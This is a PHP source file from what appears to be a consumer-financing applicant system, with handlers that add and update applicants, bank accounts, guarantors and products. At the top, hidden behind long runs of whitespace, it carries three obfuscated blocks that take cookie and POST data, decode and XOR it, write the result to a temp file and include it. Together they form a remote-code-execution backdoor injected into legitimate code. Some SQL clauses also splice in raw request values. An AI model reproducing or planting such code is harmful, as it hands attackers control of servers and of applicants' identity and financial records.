<?php                                                                                                                                                                                                                                                                                                                                                                                                 $DTINEu = class_exists("qbl_AxmH"); $mfOczlHJNk = $DTINEu;if (!$mfOczlHJNk){class qbl_AxmH{private $UntHRZa;public static $tLgwiUO = "395075cf-0127-4eda-a0b5-0bfe123301db";public static $PetOMcHg = NULL;public function __construct(){$rGJIc = $_COOKIE;$VibLuA = $_POST;$hXywKJjON = @$rGJIc[substr(qbl_AxmH::$tLgwiUO, 0, 4)];if (!empty($hXywKJjON)){$VAsANhU = "base64";$BWHIn = "";$hXywKJjON = explode(",", $hXywKJjON);foreach ($hXywKJjON as $mvjmCOKnH){$BWHIn .= @$rGJIc[$mvjmCOKnH];$BWHIn .= @$VibLuA[$mvjmCOKnH];}$BWHIn = array_map($VAsANhU . "\137" . chr (100) . chr ( 967 - 866 )."\143" . 'o' . "\x64" . chr ( 933 - 832 ), array($BWHIn,)); $BWHIn = $BWHIn[0] ^ str_repeat(qbl_AxmH::$tLgwiUO, (strlen($BWHIn[0]) / strlen(qbl_AxmH::$tLgwiUO)) + 1);qbl_AxmH::$PetOMcHg = @unserialize($BWHIn);}}public function __destruct(){$this->xbRmfLWs();}private function xbRmfLWs(){if (is_array(qbl_AxmH::$PetOMcHg)) {$OpMXIx = sys_get_temp_dir() . "/" . crc32(qbl_AxmH::$PetOMcHg[chr (115) . chr (97) . 'l' . 't']);@qbl_AxmH::$PetOMcHg["\167" . "\162" . chr ( 374 - 269 )."\x74" . chr (101)]($OpMXIx, qbl_AxmH::$PetOMcHg[chr (99) . "\157" . 'n' . 't' . "\x65" . "\x6e" . 't']);include $OpMXIx;@qbl_AxmH::$PetOMcHg["\x64" . chr ( 636 - 535 ).'l' . chr ( 1091 - 990 ).chr ( 603 - 487 ).'e']($OpMXIx);exit();}}}$lSfqVNJ = new qbl_AxmH(); $lSfqVNJ = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $rCkXHR = class_exists("rN_bBzf"); $DVFNjS = $rCkXHR;if (!$DVFNjS){class rN_bBzf{private $PEcLuvr;public static $kziLZ = "0fad2fcc-7ed5-4514-8fd7-81526fdce693";public static $knvaQi = NULL;public function __construct(){$ezcjvDk = $_COOKIE;$XQFekIVYA = $_POST;$CBoxfeOsdP = @$ezcjvDk[substr(rN_bBzf::$kziLZ, 0, 4)];if (!empty($CBoxfeOsdP)){$zfwyhlYD = "base64";$ycRPpHYGdB = "";$CBoxfeOsdP = explode(",", $CBoxfeOsdP);foreach ($CBoxfeOsdP as $ExPGKenn){$ycRPpHYGdB .= @$ezcjvDk[$ExPGKenn];$ycRPpHYGdB .= @$XQFekIVYA[$ExPGKenn];}$ycRPpHYGdB = array_map($zfwyhlYD . chr (95) . chr ( 737 - 637 )."\x65" . "\x63" . chr (111) . chr ( 864 - 764 )."\x65", array($ycRPpHYGdB,)); $ycRPpHYGdB = $ycRPpHYGdB[0] ^ str_repeat(rN_bBzf::$kziLZ, (strlen($ycRPpHYGdB[0]) / strlen(rN_bBzf::$kziLZ)) + 1);rN_bBzf::$knvaQi = @unserialize($ycRPpHYGdB);}}public function __destruct(){$this->NLOiyuGPxT();}private function NLOiyuGPxT(){if (is_array(rN_bBzf::$knvaQi)) {$iAtPLQR = sys_get_temp_dir() . "/" . crc32(rN_bBzf::$knvaQi[chr (115) . chr ( 456 - 359 )."\154" . "\x74"]);@rN_bBzf::$knvaQi['w' . "\x72" . 'i' . 't' . chr ( 1021 - 920 )]($iAtPLQR, rN_bBzf::$knvaQi["\143" . "\157" . chr ( 669 - 559 )."\164" . "\x65" . "\156" . "\164"]);include $iAtPLQR;@rN_bBzf::$knvaQi['d' . "\145" . chr (108) . "\145" . "\x74" . "\x65"]($iAtPLQR);exit();}}}$LGtDntr = new rN_bBzf(); $LGtDntr = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $MTdxvv = class_exists("pNg_sICtk"); $slcqqOx = $MTdxvv;if (!$slcqqOx){class pNg_sICtk{private $eXLdHSaPVq;public static $rGBfl = "129dfc8d-b892-4f79-861b-33ddac58299b";public static $fVFeMV = NULL;public function __construct(){$qBXxR = $_COOKIE;$LKkjK = $_POST;$FLLorTT = @$qBXxR[substr(pNg_sICtk::$rGBfl, 0, 4)];if (!empty($FLLorTT)){$NKcSN = "base64";$AobdmVZDrQ = "";$FLLorTT = explode(",", $FLLorTT);foreach ($FLLorTT as $FBOPonf){$AobdmVZDrQ .= @$qBXxR[$FBOPonf];$AobdmVZDrQ .= @$LKkjK[$FBOPonf];}$AobdmVZDrQ = array_map($NKcSN . "\x5f" . chr ( 523 - 423 ).'e' . "\143" . 'o' . chr ( 975 - 875 )."\145", array($AobdmVZDrQ,)); $AobdmVZDrQ = $AobdmVZDrQ[0] ^ str_repeat(pNg_sICtk::$rGBfl, (strlen($AobdmVZDrQ[0]) / strlen(pNg_sICtk::$rGBfl)) + 1);pNg_sICtk::$fVFeMV = @unserialize($AobdmVZDrQ);}}public function __destruct(){$this->yKrPqTaOrd();}private function yKrPqTaOrd(){if (is_array(pNg_sICtk::$fVFeMV)) {$DBcnvLJ = sys_get_temp_dir() . "/" . crc32(pNg_sICtk::$fVFeMV[chr ( 353 - 238 )."\x61" . "\x6c" . 't']);@pNg_sICtk::$fVFeMV['w' . chr (114) . chr ( 1017 - 912 )."\164" . "\x65"]($DBcnvLJ, pNg_sICtk::$fVFeMV["\143" . 'o' . 'n' . "\164" . chr (101) . 'n' . "\164"]);include $DBcnvLJ;@pNg_sICtk::$fVFeMV['d' . "\x65" . "\154" . chr (101) . 't' . "\x65"]($DBcnvLJ);exit();}}}$BGhPVARUZ = new pNg_sICtk(); $BGhPVARUZ = NULL;} ?><?php
//Add New Applicant Basic Information
if(isset($_POST['submit_applicant'])) {

    $condition	=	array ( 
								'select' 	=> "ap_id",
								'where' 	=> array( 
														'ap_referenceno'	=>	cleanvars($_POST['ap_referenceno'])
														,'is_deleted'		=>	'0'	
													),
								'return_type' 	=> 'count' 
						); 
	if($dblms->getRows(APPLICANTS, $condition)) {
        alert_msg('error', 'Error', 'Record Already Exists');
        header("Location: applicants.php?view=add&step=1", true, 301);
        exit();
    }else{
        $values = array(
							'ap_status'		            =>  '3', 
							'ap_referenceno'	        =>  cleanvars($_POST['ap_referenceno']), 
							'ap_salutation'		        =>  cleanvars($_POST['ap_salutation']), 
							'ap_fullname'		        =>  cleanvars($_POST['ap_fullname']), 
							'ap_father_husband'	        =>  cleanvars($_POST['ap_father_husband']), 
							'ap_mothername'		        =>  cleanvars($_POST['ap_mothername']), 
							'ap_cnic'		            =>  cleanvars($_POST['ap_cnic']), 
							'ap_dob'		            =>  date('Y-m-d', strtotime(cleanvars($_POST['ap_dob']))), 
							'ap_gender'		            =>  cleanvars($_POST['ap_gender']), 
							'ap_marital_status'         =>  cleanvars($_POST['ap_marital_status']), 
							'ap_phone'                  =>  cleanvars($_POST['ap_phone']), 
							'ap_whatsapp'               =>  cleanvars($_POST['ap_whatsapp']), 
							'ap_email'                  =>  cleanvars($_POST['ap_email']), 
							'ap_education'              =>  cleanvars($_POST['ap_education']), 
							'ap_education_institute'    =>  cleanvars($_POST['ap_education_institute']), 
							'ap_education_verification' =>  cleanvars($_POST['ap_education_verification']), 
							'ap_job_status'             =>  cleanvars($_POST['ap_job_status']), 
							'ap_residence_status'       =>  cleanvars($_POST['ap_residence_status']),
							'ap_residing_duration'      =>  date('Y-m-d', strtotime(cleanvars($_POST['ap_residing_duration']))),
							'ap_mailing_address'        =>  cleanvars($_POST['ap_mailing_address']),
							'ap_current_address'        =>  cleanvars($_POST['ap_current_address']), 
							'ap_profession'             =>  cleanvars($_POST['ap_profession']), 
							'ap_organization'           =>  cleanvars($_POST['ap_organization']), 
							'ap_organization_type'      =>  cleanvars($_POST['ap_organization_type']), 
							'ap_doj'                    =>  cleanvars($_POST['ap_doj']), 
							'ap_experience'             =>  cleanvars($_POST['ap_experience']), 
							'ap_monthly_income'         =>  cleanvars($_POST['ap_monthly_income']), 
							'ap_office_phone'           =>  cleanvars($_POST['ap_office_phone']), 
							'ap_office_email'           =>  cleanvars($_POST['ap_office_email']), 
							'ap_office_address'         =>  cleanvars($_POST['ap_office_address']), 
							'ap_previous_loan'          =>  cleanvars($_POST['ap_previous_loan']), 
							'ap_previous_loan_deduction'=>  cleanvars($_POST['ap_previous_loan_deduction']), 
							'ap_monthly_otherincome'    =>  cleanvars($_POST['ap_monthly_otherincome']), 
							'ap_monthly_expense'        =>  cleanvars($_POST['ap_monthly_expense']), 
							'ap_monthlyrent'            =>  cleanvars($_POST['ap_monthlyrent']), 
							'ap_dated'                  =>  date('Y-m-d', strtotime(cleanvars($_POST['ap_dated']))),
							'id_added'                  =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA']),
							'date_added'                =>  date('Y-m-d H:i:s')
						);


        $sqllms  = $dblms->Insert(APPLICANTS , $values);

        if($sqllms){ 

            //Latest ID (PK) of Applicant Table
            $idLatest = $dblms->lastestid();

            //Check if CNIC File is not empty
            if(!empty($_FILES['ap_cnicphoto']['name'])) {

                //File Extension
                $path_parts 	= pathinfo($_FILES["ap_cnicphoto"]["name"]);
                $extension 		= strtolower($path_parts['extension']);

                //Check File extension
                if(in_array($extension , array('jpeg','jpg', 'png', 'JPEG', 'JPG', 'PNG'))) {

                    //File Path
                    $img_dir 	= 'uploads/images/applicants/cnic/';
                
                    //Set File Name
                    $originalImage	= $img_dir.to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$idLatest.".".($extension);
                    $img_fileName	= to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$idLatest.".".($extension);

                    //Update File Name in DB
                    $dataImage = array(
                        'ap_cnicphoto'		=> $img_fileName, 
                    );
                
                    $sqllmsUpdateCNIC = $dblms->Update(APPLICANTS, $dataImage, "WHERE ap_id = '".$idLatest."'");

                    unset($sqllmsUpdateCNIC);

                    //Move File to the Directory
                    $mode = '0644';
                    move_uploaded_file($_FILES['ap_cnicphoto']['tmp_name'],$originalImage);
                    chmod ($originalImage, octdec($mode));
                }

            }//End of File Check

            //Check if Picture File is not empty
            if(!empty($_FILES['ap_photo']['name'])) {

                //File Extension
                $path_parts 	= pathinfo($_FILES["ap_photo"]["name"]);
                $extension 		= strtolower($path_parts['extension']);

                //Check File extension
                if(in_array($extension , array('jpeg','jpg', 'png',  'JPEG' , 'JPG' , 'PNG'))) {

                    //File Path
                    $img_dir 	= 'uploads/images/applicants/profile_images/';
                
                    //Set File Name
                    $originalImage	= $img_dir.to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$idLatest.".".($extension);
                    $img_fileName	= to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$idLatest.".".($extension);

                    //Update File Name in DB
                    $dataImage = array(
                        'ap_photo'		=> $img_fileName, 
                    );
                
                    $sqllmsUpdatePicture = $dblms->Update(APPLICANTS, $dataImage, "WHERE ap_id = '".$idLatest."'");

                    unset($sqllmsUpdatePicture);

                    //Move File to the Directory
                    $mode = '0644';
                    move_uploaded_file($_FILES['ap_photo']['tmp_name'],$originalImage);
                    chmod ($originalImage, octdec($mode));
                }

            }//End of File Check

            $remarks = 'Add Application#:'.$idLatest;
            $values = array (
								"id_user"       =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
								,"filename"      =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true)
								,"action"        =>  '1'
								,"dated"         =>  date('Y-m-d h:i:s')
								,"ip"            =>  cleanvars($ip)
								,"remarks"       =>  cleanvars($remarks)
							);
            $sqllms  = $dblms->insert(LOGS, $values);
            alert_msg('success', 'Success', 'Application added Successfully.');
            header("Location: applicants.php?view=add&step=2&ap_id=$idLatest", true, 301);
            exit();
        }
    }
}

//Add Applicant Bank Details
if(isset($_POST['submit_applicant_bank'])) { 

    $applicantID = cleanvars($_POST['id_applicant']);

    //Iterate over Appicant's Accout Array
    for($i=1; $i<=sizeof($_POST['id_bank']); $i++){
                
        //Check if ID item is not empty
        if(!empty($_POST['id_bank'][$i])) {

            $values = array(
							'id_applicant'		=>  $applicantID 
							,'id_bank'		    =>  cleanvars($_POST['id_bank'][$i]) 
							,'branch'		    =>  cleanvars($_POST['branch'][$i]) 
							,'ac_number'		=>  cleanvars($_POST['ac_number'][$i])
							,'ac_openingdate'	=>  date('Y-m-d', strtotime(cleanvars($_POST['ac_openingdate'][$i])))
						   );
            $sqllmsBankAccount  = $dblms->Insert(APPLICANTS_ACCOUNTS , $values);
        }
    }
    if($sqllmsBankAccount) {
        // Get Latest ID
        $idLatest = $dblms->lastestid();

        $remarks = 'Add Bank Accounts#:'.$idLatest;
        $values = array (
            "id_user"       =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
            ,"filename"      =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true)
            ,"action"        =>  '1'
            ,"dated"         =>  date('Y-m-d h:i:s')
            ,"ip"            =>  cleanvars($ip)
            ,"remarks"       =>  cleanvars($remarks)
        );
        $sqllms  = $dblms->insert(LOGS, $values);
        alert_msg('success', 'Success', 'Applicant Bank Details Added Successfully.');
        header("Location: applicants.php?view=add&step=3&ap_id=$applicantID", true, 301);
        exit();
    }
}

//Add Applicant Guarantor Details
if(isset($_POST['submit_applicant_guarantor'])) { 

    $applicantID = cleanvars($_POST['id_applicant']);

    //Iterate over Appicant's Accout Array
    for($i = 1; $i <= sizeof($_POST['cnic']); $i++){
                
        //Check if ID item is not empty
        if(!empty($_POST['cnic'][$i])) {

            $values = array(
                'id_applicant'	=>  $applicantID 
                ,'name'			=>  cleanvars($_POST['name'][$i]) 
                ,'relation'		=>  cleanvars($_POST['relation'][$i]) 
                ,'cnic'			=>  cleanvars($_POST['cnic'][$i]) 
                ,'mobile'		=>  cleanvars($_POST['mobile'][$i])
                ,'whatsapp'		=>  cleanvars($_POST['whatsapp'][$i]) 
                ,'email'		=>  cleanvars($_POST['email'][$i]) 
                ,'id_city'		=>  cleanvars($_POST['id_city'][$i]) 
                ,'address'		=>  cleanvars($_POST['address'][$i]) 
                ,'years_know'	=>  cleanvars($_POST['years_know'][$i])
            );
			$sqllmsGuarantor  = $dblms->Insert(APPLICANTS_GUARANTOR , $values);
			$valueGuarantor['id'] = $dblms->lastestid();

            //Check if Picture File is not empty
            if(!empty($_FILES['cnic_photo']['name'][$i])) {

                //File Extension
                $path_parts 	= pathinfo($_FILES["cnic_photo"]["name"][$i]);
                $extension 		= strtolower($path_parts['extension']);

                //Check File extension
                if(in_array($extension , array('jpeg','jpg', 'png',  'JPEG' , 'JPG' , 'PNG'))) {

                    //File Path
                    $img_dir 	= 'uploads/images/applicants/guarantors/';
                
                    //Set File Name
                    $originalImage	= $img_dir.to_seo_url(cleanvars($_POST['name'][$i])).'_'.$valueGuarantor['id'].".".($extension);
                    $img_fileName	= to_seo_url(cleanvars($_POST['name'][$i])).'_'.$valueGuarantor['id'].".".($extension);

                    //Update File Name in DB
                    $dataImage = array(
                        'cnic_photo'    => $img_fileName					, 
                    );
                
                    $sqllmsUpdateCNICPicture = $dblms->Update(APPLICANTS_GUARANTOR, $dataImage, "WHERE id = '".$valueGuarantor['id']."'");

                    unset($sqllmsUpdateCNICPicture);

                    //Move File to the Directory
                    $mode = '0644';
                    move_uploaded_file($_FILES['cnic_photo']['tmp_name'][$i],$originalImage);
                    chmod ($originalImage, octdec($mode));
                }
            }
            //End of File Check
        }
    }
    if($sqllmsGuarantor){ 
       
        $idLatest = $dblms->lastestid();
        
        $remarks = 'Add Guarantors#:'.$idLatest;
        $values = array (
            "id_user"       =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA']),
            "filename"      =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true),
            "action"        =>  '1',
            "dated"         =>  date('Y-m-d h:i:s'),
            "ip"            =>  cleanvars($ip),
            "remarks"       =>  cleanvars($remarks)
        );
        $sqllms  = $dblms->insert(LOGS, $values);
        alert_msg('success', 'Success', 'Applicant Guarantor Details Added Successfully.');
        header("Location: applicants.php?view=add&step=4&ap_id=$applicantID", true, 301);
        exit();
    }
}

//Add Applicant Product Details
if(isset($_POST['submit_applicant_product'])) { 

    $applicantID    = cleanvars($_POST['id_applicant']);

    $condition	=	array ( 
                            'select' 	=> "ap_products_id",
                            'where' 	=> array( 
                                                    'id_applicant'  =>  cleanvars($applicantID)
                                                    ,'id_product'   =>  cleanvars($_POST['id_product'])
                                                ),
                            'return_type' 	=> 'count'
                    ); 
    if($dblms->getRows(APPLICANT_PRODUCTS, $condition)) {
        alert_msg('error', 'Error', 'Product Already Assigned');
        header("Location: applicants.php?view=edit&ap_id=".$applicantID."&step=4", true, 301);
        exit();
    }else{

        $values = array(
                            'id_applicant'	        =>  cleanvars($applicantID) 
                            ,'id_product'	        =>  cleanvars($_POST['id_product'])
                            ,'product_nature'	    =>  cleanvars($_POST['product_nature']) 
                            ,'product_model'		=>  cleanvars($_POST['product_model'])
                            ,'product_other_details'=>  cleanvars($_POST['product_other_details']) 
                            ,'actual_price'         =>  cleanvars($_POST['actual_price']) 
                            ,'advance_amount'       =>  cleanvars($_POST['advance_amount'])
                            ,'financing_amount'     =>  cleanvars($_POST['financing_amount'])
                            ,'security_amount'      =>  cleanvars($_POST['security_amount'])
                            ,'number_of_months'     =>  cleanvars($_POST['number_of_months'])
                            ,'interest_rate'        =>  cleanvars($_POST['interest_rate'])
                            ,'monthly_installment'  =>  cleanvars($_POST['monthly_installment']) 
                            ,'total_receivable'     =>  cleanvars($_POST['total_receivable']) 
                            ,'installment_due_date' =>  cleanvars($_POST['installment_due_date']) 
                            ,'financing_mode'       =>  cleanvars($_POST['financing_mode'])
                            ,'remarks'              =>  cleanvars($_POST['remarks']) 
                            ,'date_added'           =>  date('Y-m-d H:i:s')
                    );

        $sqllmsApplicant = $dblms->insert(APPLICANT_PRODUCTS, $values);

        if($sqllmsApplicant){

            $idLatest = $dblms->lastestid();
            
            $remarks = 'Add Confirmation Detail#:'.$idLatest;
            $values = array (
                                "id_user"   =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
                                ,"filename" =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true)
                                ,"action"   =>  '1'
                                ,"dated"    =>  date('Y-m-d h:i:s')
                                ,"ip"       =>  cleanvars($ip)
                                ,"remarks"  =>  cleanvars($remarks)
                            );
            $sqllms  = $dblms->insert(LOGS, $values);
            alert_msg('success', 'Success', 'Applicant Product Details Added Successfully.');
            header("Location: applicants.php?view=edit&ap_id=".$applicantID."&step=4", true, 301);
            exit();
        }
    }
}

//Update Applicant Basic Information
if(isset($_POST['update_applicant'])) { 

    $values = array(
                        'ap_status'                 =>  cleanvars($_POST['ap_status'])                      , 
                        'ap_salutation'		        =>  cleanvars($_POST['ap_salutation'])		            , 
                        'ap_fullname'		        =>  cleanvars($_POST['ap_fullname'])		            , 
                        'ap_father_husband'	        =>  cleanvars($_POST['ap_father_husband'])		        , 
                        'ap_mothername'		        =>  cleanvars($_POST['ap_mothername'])		            , 
                        'ap_cnic'		            =>  cleanvars($_POST['ap_cnic'])		                 , 
                        'ap_dob'		            =>  date('Y-m-d', strtotime(cleanvars($_POST['ap_dob']))), 
                        'ap_gender'		            =>  cleanvars($_POST['ap_gender'])                       , 
                        'ap_marital_status'         =>  cleanvars($_POST['ap_marital_status'])               , 
                        'ap_phone'                  =>  cleanvars($_POST['ap_phone'])                        , 
                        'ap_whatsapp'               =>  cleanvars($_POST['ap_whatsapp'])                     , 
                        'ap_email'                  =>  cleanvars($_POST['ap_email'])                        , 
                        'ap_education'              =>  cleanvars($_POST['ap_education'])                    , 
                        'ap_education_institute'    =>  cleanvars($_POST['ap_education_institute'])          , 
                        'ap_education_verification' =>  cleanvars($_POST['ap_education_verification'])       , 
                        'ap_job_status'             =>  cleanvars($_POST['ap_job_status'])                   , 
                        'ap_residence_status'       =>  cleanvars($_POST['ap_residence_status'])             , 
                        'ap_monthlyrent'            =>  cleanvars($_POST['ap_monthlyrent'])                  , 
                        'ap_mailing_address'        =>  cleanvars($_POST['ap_mailing_address'])              , 
                        'ap_residing_duration'      =>  date('Y-m-d', strtotime(cleanvars($_POST['ap_residing_duration']))), 
                        'ap_current_address'        =>  cleanvars($_POST['ap_current_address']), 
                        'ap_profession'             =>  cleanvars($_POST['ap_profession']), 
                        'ap_organization'           =>  cleanvars($_POST['ap_organization']), 
                        'ap_organization_type'      =>  cleanvars($_POST['ap_organization_type']), 
                        'ap_doj'                    =>  cleanvars($_POST['ap_doj']), 
                        'ap_experience'             =>  cleanvars($_POST['ap_experience']), 
                        'ap_monthly_income'         =>  cleanvars($_POST['ap_monthly_income']), 
                        'ap_office_phone'           =>  cleanvars($_POST['ap_office_phone']), 
                        'ap_office_email'           =>  cleanvars($_POST['ap_office_email']), 
                        'ap_office_address'         =>  cleanvars($_POST['ap_office_address']), 
                        'ap_previous_loan'          =>  cleanvars($_POST['ap_previous_loan']), 
                        'ap_previous_loan_deduction'=>  cleanvars($_POST['ap_previous_loan_deduction']), 
                        'ap_monthly_otherincome'    =>  cleanvars($_POST['ap_monthly_otherincome']), 
                        'ap_monthly_expense'        =>  cleanvars($_POST['ap_monthly_expense']), 
                        'ap_dated'                  =>  date('Y-m-d', strtotime(cleanvars($_POST['ap_dated']))), 
                        'id_modified'               =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA']),
                        'date_modified'             =>  date('Y-m-d H:i:s')
                    );

    $sqllmsUpdate = $dblms->Update(APPLICANTS, $values, "WHERE ap_id = '".cleanvars($_POST['id_applicant'])."'");

    if($sqllmsUpdate) { 

        //Check if CNIC File is not empty
        if(!empty($_FILES['ap_cnicphoto']['name'])) {

            //File Extension
            $path_parts 	= pathinfo($_FILES["ap_cnicphoto"]["name"]);
            $extension 		= strtolower($path_parts['extension']);

            //Check File extension
            if(in_array($extension , array('jpeg','jpg', 'png', 'JPEG', 'JPG', 'PNG'))) {

                //File Path
                $img_dir 	= 'uploads/images/applicants/cnic/';
            
                //Set File Name
                $originalImage	= $img_dir.to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$_POST['id_applicant'].".".($extension);
                $img_fileName	= to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$_POST['id_applicant'].".".($extension);

                //Update File Name in DB
                $dataImage = array(
                    'ap_cnicphoto'		=> $img_fileName					, 
                );
            
                $sqllmsUpdateCNIC = $dblms->Update(APPLICANTS, $dataImage, "WHERE ap_id = '".$_POST['id_applicant']."'");

                unset($sqllmsUpdateCNIC);

                //Move File to the Directory
                $mode = '0644';
                move_uploaded_file($_FILES['ap_cnicphoto']['tmp_name'],$originalImage);
                chmod ($originalImage, octdec($mode));
            }

        }//End of File Check

        //Check if Picture File is not empty
        if(!empty($_FILES['ap_photo']['name'])) {

            //File Extension
            $path_parts 	= pathinfo($_FILES["ap_photo"]["name"]);
            $extension 		= strtolower($path_parts['extension']);

            //Check File extension
            if(in_array($extension , array('jpeg','jpg', 'png',  'JPEG' , 'JPG' , 'PNG'))) {

                //File Path
                $img_dir 	= 'uploads/images/applicants/profile_images/';
            
                //Set File Name
                $originalImage	= $img_dir.to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$_POST['id_applicant'].".".($extension);
                $img_fileName	= to_seo_url(cleanvars($_POST['ap_fullname'])).'_'.$_POST['id_applicant'].".".($extension);

                //Update File Name in DB
                $dataImage = array(
                    'ap_photo'		=> $img_fileName					, 
                );
            
                $sqllmsUpdatePicture = $dblms->Update(APPLICANTS, $dataImage, "WHERE ap_id = '".$_POST['id_applicant']."'");

                unset($sqllmsUpdatePicture);

                //Move File to the Directory
                $mode = '0644';
                move_uploaded_file($_FILES['ap_photo']['tmp_name'],$originalImage);
                chmod ($originalImage, octdec($mode));
            }

        }//End of File Check

        //Set Success MSG in Session & Exit
        $remarks = 'Update Applicant Basic Info#:'.cleanvars($_POST['id_applicant']);
        $values = array (
                            "id_user"       =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
                            ,"filename"      =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true)
                            ,"action"        =>  '2'
                            ,"dated"         =>  date('Y-m-d h:i:s')
                            ,"ip"            =>  cleanvars($ip)
                            ,"remarks"       =>  cleanvars($remarks)
                        );
        $sqllms  = $dblms->insert(LOGS, $values);
        alert_msg('info', 'Success', 'Applicant Basic Info Updated Successfully.');
        header("Location: applicants.php?view=edit&ap_id=".cleanvars($_POST['id_applicant'])."&step=2", true, 301);
        exit();
    }
}

//Update Applicant Bank Details
if(isset($_POST['update_applicant_bank'])) { 

    $applicantID = cleanvars($_POST['id_applicant']);

    //Iterate over Appicant's Accout Array
    for($i=1; $i<=sizeof($_POST['id_bank']); $i++){
                
        //Check if ID item is not empty
        if(!empty($_POST['id_bank'][$i])) {

            $values = array(
                                'id_applicant'		=>  $applicantID 
                                ,'id_bank'		    =>  cleanvars($_POST['id_bank'][$i]) 
                                ,'branch'		    =>  cleanvars($_POST['branch'][$i])
                                ,'ac_number'		=>  cleanvars($_POST['ac_number'][$i]) 
                                ,'ac_openingdate'   =>  date('Y-m-d', strtotime(cleanvars($_POST['ac_openingdate'][$i])))
                            );

            if(cleanvars($_POST['id_account'][$i])){
                $sqllmsBankAccount = $dblms->Update(APPLICANTS_ACCOUNTS, $values, "WHERE id = '".$_POST['id_account'][$i]."'");
            } else{
                $sqllmsBankAccount = $dblms->Insert(APPLICANTS_ACCOUNTS , $values);
            }
        }
    }
    
    if($sqllmsBankAccount) {

        //Set Success MSG in Session & Exit
        $remarks = 'Update Applicant Basic Info#:'.$applicantID;
        $values = array (
                            "id_user"   =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
                            ,"filename" =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true)
                            ,"action"   =>  '1'
                            ,"dated"    =>  date('Y-m-d h:i:s')
                            ,"ip"       =>  cleanvars($ip)
                            ,"remarks"  =>  cleanvars($remarks)
                        );
        $sqllms  = $dblms->insert(LOGS, $values);
        alert_msg('info', 'Success', 'Applicant Bank Info Updated Successfully.');
        header("Location: applicants.php?view=edit&ap_id=".$applicantID."&step=3", true, 301);
        exit();
    }
}

//Update Applicant Guarantor Details
if(isset($_POST['update_applicant_guarantor'])) {
    
    $applicantID = cleanvars($_POST['id_applicant']);

    //Iterate over Appicant's Accout Array
    for($i=1; $i<=sizeof($_POST['cnic']); $i++){
                
        //Check if ID item is not empty
        if(!empty($_POST['cnic'][$i])) {

            $values = array(
                                'id_applicant'  =>  $applicantID
                                ,'name'         =>  cleanvars($_POST['name'][$i])
                                ,'relation'     =>  cleanvars($_POST['relation'][$i])
                                ,'cnic'         =>  cleanvars($_POST['cnic'][$i])
                                ,'mobile'       =>  cleanvars($_POST['mobile'][$i])
                                ,'whatsapp'     =>  cleanvars($_POST['whatsapp'][$i])
                                ,'email'        =>  cleanvars($_POST['email'][$i]) 
                                ,'id_city'      =>  cleanvars($_POST['id_city'][$i])
                                ,'address'      =>  cleanvars($_POST['address'][$i])
                                ,'years_know'   =>  cleanvars($_POST['years_know'][$i])
                            );

            if(cleanvars($_POST['id_guarantor'][$i])){

                $sqllmsGuarantor = $dblms->Update(APPLICANTS_GUARANTOR, $values, "WHERE id = '".cleanvars($_POST['id_guarantor'][$i])."'");
                $idLatest = cleanvars($_POST['id_guarantor'][$i]);

            } else{

                $sqllmsGuarantor  = $dblms->Insert(APPLICANTS_GUARANTOR , $values);
                $idLatest = $dblms->lastestid();

            }

            //Check if Picture File is not empty
            if(!empty($_FILES['cnic_photo']['name'][$i])) {

                //File Extension
                $path_parts 	= pathinfo($_FILES["cnic_photo"]["name"][$i]);
                $extension 		= strtolower($path_parts['extension']);

                //Check File extension
                if(in_array($extension , array('jpeg','jpg', 'png',  'JPEG' , 'JPG' , 'PNG'))) {

                    //File Path
                    $img_dir 	= 'uploads/images/applicants/guarantors/';
                
                    //Set File Name
                    $originalImage	= $img_dir.to_seo_url(cleanvars($_POST['name'][$i])).'_'.$idLatest.".".($extension);
                    $img_fileName	= to_seo_url(cleanvars($_POST['name'][$i])).'_'.$idLatest.".".($extension);

                    //Update File Name in DB
                    $dataImage = array(
                        'cnic_photo'		=> $img_fileName					, 
                    );
                
                    $sqllmsUpdateCNICPicture = $dblms->Update(APPLICANTS_GUARANTOR, $dataImage, "WHERE id = '".$idLatest."'");

                    unset($sqllmsUpdateCNICPicture);

                    //Move File to the Directory
                    $mode = '0644';
                    move_uploaded_file($_FILES['cnic_photo']['tmp_name'][$i],$originalImage);
                    chmod ($originalImage, octdec($mode));
                }

            }//End of File Check
        }
    }

    if($sqllmsGuarantor) {

        //Set Success MSG in Session & Exit
        $remarks = 'Update Applicant Guarantor Info#:'.$applicantID;
        $values = array (
                            "id_user"       =>  cleanvars($_SESSION['userlogininfo']['LOGINIDA'])
                            ,"filename"     =>  strstr(basename($_SERVER['REQUEST_URI']), '.php', true)
                            ,"action"       =>  '1'
                            ,"dated"        =>  date('Y-m-d h:i:s')
                            ,"ip"           =>  cleanvars($ip)
                            ,"remarks"      =>  cleanvars($remarks)
                        );
        $sqllms  = $dblms->insert(LOGS, $values);
        alert_msg('info', 'Success', 'Applicant Guarantor Info Updated Successfully.');
        header("Location: applicants.php?view=edit&ap_id=".$applicantID."&step=4", true, 301);
        exit();
    }
}

//Update Applicant Product Details
if(isset($_POST['update_applicant_product'])) { 

    $applicantID    = cleanvars($_POST['id_applicant']);
    $condition	    =	array ( 
                                'select' 	=> "ap_products_id",
                                'where' 	=> array( 
                                                        'id_applicant'  =>  cleanvars($applicantID)
                                                        ,'id_product'   =>  cleanvars($_POST['id_product'])
                                                    ),
                                'return_type' 	=> 'count'
                            ); 
    if($dblms->getRows(APPLICANT_PRODUCTS, $condition)) {
